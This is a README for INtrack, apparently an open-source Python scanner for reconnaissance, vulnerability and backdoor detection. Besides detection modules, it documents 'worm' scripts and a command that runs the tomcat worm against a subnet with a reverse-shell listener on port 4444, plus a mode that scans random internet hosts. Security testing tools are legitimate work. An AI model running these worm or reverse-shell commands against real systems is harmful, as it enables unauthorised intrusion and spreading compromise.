# INtrack - Internet Crawler & Security Scanner

<p align="center">
  <img src="docs/logo.png" alt="INtrack Logo" width="250"/>
</p>

INtrack is a powerful, multi-threaded security scanner and internet crawler designed for network reconnaissance, vulnerability detection, and security assessment. It can scan for a wide variety of instances, vulnerabilities, IoT devices, exposures, and more.

## Features

- 🔍 **Comprehensive Scanning**: Detect web servers, applications, vulnerable services, and more
- 🌐 **Flexible Target Selection**: Scan single hosts, subnets, random internet IPs, or targets from a file
- 🛠️ **Multiple Scanner Types**:
  - Vulnerability scanners for known CVEs
  - Instance detection (WordPress, Jira, Apache, Nginx, etc.)
  - IoT device detection
  - Backdoor implant detection
  - Network service identification
  - Exposure scanners (robots.txt, security.txt, etc.)
- 🔄 **Multi-threaded**: Fast, concurrent scanning with customizable thread count
- 🔧 **Customizable**: Configure ports, timeouts, and scan types
- 📊 **Progress Visualization**: Real-time scanning progress with alive-progress bar

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/INtrack.git
cd INtrack

# Install dependencies
pip install -r requirements.txt
```

## Usage

### Basic Usage

```bash
python3 main.py -host 192.168.1.1 -p 80,443
```

### Scan Types

```bash
# Check for WordPress instances
python3 main.py -host 192.168.1.0/24 -instance wordpress

# Scan for specific vulnerability
python3 main.py -host 192.168.1.0/24 -vuln CVE-2017-7921

# Detect IoT devices
python3 main.py -host 192.168.1.0/24 -iot hikvision

# Check for exposed API documentation
python3 main.py -host 192.168.1.0/24 -exposure api-docs

# Search for backdoor implants
python3 main.py -host 192.168.1.0/24 -backdoor antsword

# Run network checks
python3 main.py -host 192.168.1.0/24 -network telnet
```

### Target Selection

```bash
# Scan a single host
python3 main.py -host 192.168.1.1 -instance wordpress

# Scan a subnet
python3 main.py -host 192.168.1.0/24 -instance nginx

# Scan targets from a file
python3 main.py -f targets.txt -instance jira

# Scan random internet hosts
python3 main.py -n 100 -instance apache
```

### Advanced Options

```bash
# Combine multiple scan types
python3 main.py -host 192.168.1.0/24 -instance "wordpress,jira" -exposure "robots-txt,security-txt"

# Save results to a file
python3 main.py -host 192.168.1.0/24 -instance wordpress -o results.txt

# Resolve hostnames for IPs
python3 main.py -host 192.168.1.0/24 -hostname -instance wordpress

# Use more threads for faster scanning
python3 main.py -host 192.168.1.0/24 -t 50 -instance wordpress

# Execute worm scripts (requires listener)
python3 main.py -host 192.168.1.0/24 -worm tomcat -lh 192.168.1.100 -lp 4444

# Probe for HTTP/HTTPS services
python3 main.py -host 192.168.1.0/24 -probe -o webservers.txt
```

### List All Available Scanners

```bash
python3 main.py -list
```

## Available Scanners

### Worms
- vscode-sftp
- microsoft
- tomcat
- hadoop

### Backdoors
- antsword
- cisco
- fatpipe

### Exposures
- robots-txt
- security-txt
- sitemap
- api-docs

### Instances
- wordpress
- microsoft
- server
- webmin
- thinkphp
- weblogic
- drupal
- ncast
- jira
- joomla
- zimbra
- apache
- php
- webdav
- moveit
- nginx

### Network Checks
- telnet
- rdp
- rtsp
- adb-misconfig
- port-scanner

### IoT Checks
- gargoyle
- gpon
- webcamxp
- netgear
- hikvision
- cisco
- epmp
- network-camera
- routeros

### Vulnerabilities
- Multiple CVEs (use `-list` to see all)

## Command Line Arguments

| Argument | Description |
|----------|-------------|
| `-host` | Specify a single target IP or subnet range |
| `-f` | Specify a file containing target IPs |
| `-n` | Number of random targets to find |
| `-p` | Port(s) to check (default: 80) |
| `-t` | Number of threads to use (default: 25) |
| `-o` | Store results into a file |
| `-lh/lhost` | Add a listening host for reverse shells |
| `-lp/lport` | A listening port for reverse shells |
| `-hostname` | Resolve hostnames for IP addresses |
| `-instance` | Type of instance to check |
| `-backdoor` | Look for backdoor implants |
| `-worm` | Enable special script execution |
| `-vuln` | Enable vulnerability script execution |
| `-exposure` | Used to detect exposure files |
| `-iot` | Used to detect IoT devices |
| `-miscellaneous` | Used for miscellaneous checks |
| `-workflows` | Run workflow scans on targets |
| `-network` | Used for network scans |
| `-timeout` | Timeout seconds for web requests (default: 10) |
| `-probe` | Used for probing hosts for HTTP/HTTPS |
| `-spider` | Specify subnet range to scan if a result is found |
| `-list` | List available scanners and checks |

## Legal Disclaimer

This tool is intended for legal security assessments, penetration testing, and educational purposes only. Use responsibly and only against systems you own or have explicit permission to test.

## License

[MIT License](LICENSE)

## Contributing

Contributions are welcome! Please follow the standard contribution guidelines for submitting issues or pull requests.

---

**Stay tuned for updates as we continue to improve INtrack!**
